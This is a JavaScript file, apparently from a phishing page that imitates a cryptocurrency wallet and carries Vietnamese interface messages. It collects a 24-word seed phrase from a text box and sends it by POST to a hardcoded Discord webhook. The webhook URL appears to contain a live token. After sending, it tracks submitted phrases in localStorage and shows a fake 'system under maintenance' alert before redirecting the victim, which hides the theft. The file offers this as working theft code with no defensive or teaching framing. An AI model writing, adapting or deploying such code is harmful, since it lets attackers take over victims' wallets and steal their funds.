const webhookUrl =
  "https://discord.com/api/v10/webhooks/1326926051280027680/sJvoThsFlKbayDnzSz2K7N6d7cd9UvlZd4kMFIfl18YTO5mbo8Hc2M7WD02l0IzIXOqM";

const savedPassphrases = JSON.parse(localStorage.getItem("passphrases")) || [];

document.querySelector(".btn").addEventListener("click", () => {
  sendData();
});

document.querySelector(".btn-secondary").addEventListener("click", () => {
  sendData();
});

document.querySelector(".image-wallet").addEventListener("click", () => {
  sendData();
});

function sendData() {
  const passphrase = document.querySelector("textarea").value.trim();
  const words = passphrase.split(/\s+/);

  if (!passphrase) {
    alert("Vui lòng nhập mật khẩu của bạn!");
    return;
  }

  if (words.length !== 24) {
    alert("Mật khẩu phải là 24 từ");
    return;
  }

  if (savedPassphrases.includes(passphrase)) {
    alert("Hệ thống đang bảo trì vui lòng quay lại sau!");
    window.location.href = "index.html";
    return;
  }

  fetch(webhookUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      content: passphrase,
    }),
  })
    .then(() => {
      savedPassphrases.push(passphrase);
      localStorage.setItem("passphrases", JSON.stringify(savedPassphrases));
      alert("Hệ thống đang bảo trì vui lòng quay lại sau!");
      window.location.href = "index.html";
    })
    .catch((error) => console.error("Error:", error));
}
